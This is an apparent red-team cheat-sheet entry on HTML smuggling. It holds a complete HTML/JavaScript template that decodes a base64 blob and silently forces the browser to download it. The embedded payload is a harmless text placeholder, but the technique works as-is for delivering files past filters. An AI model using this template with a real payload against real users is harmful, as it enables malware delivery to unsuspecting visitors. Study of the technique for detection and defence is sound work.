# Web

### HTML Smuggling

Abuses HTML5 anchor attribute to automatically download a file:

```markup
<html>
<body>
    <script>
        function base64ToArrayBuffer(base64){
          var binary_string = window.atob(base64);
          var len = binary_string.length;
          var bytes = new Uint8Array(len);
          for (var i=0;i<len;i++) { bytes[i] = binary_string.charCodeAt(i); }
          return bytes.buffer;
        }
        
        var file = 'eGN0Cg=='
        var blob = new Blob([base64ToArrayBuffer(file)], {type: 'octet/stream'});
        var fileName = "xct.txt"

        // Edge
        if(navigator.msSaveBlob) {
    		  navigator.msSaveBlob(blob,fileName);
    	  // Other Browsers
    	  } else {    
	        var a = document.createElement('a');
	        document.body.appendChild(a);
	        a.style = 'display: none';
	        var url = window.URL.createObjectURL(blob);
	        a.href = url;
	        a.download = fileName;
	        a.click();
	        window.URL.revokeObjectURL(url);
	    }
    </script>
</body>
</html>
```



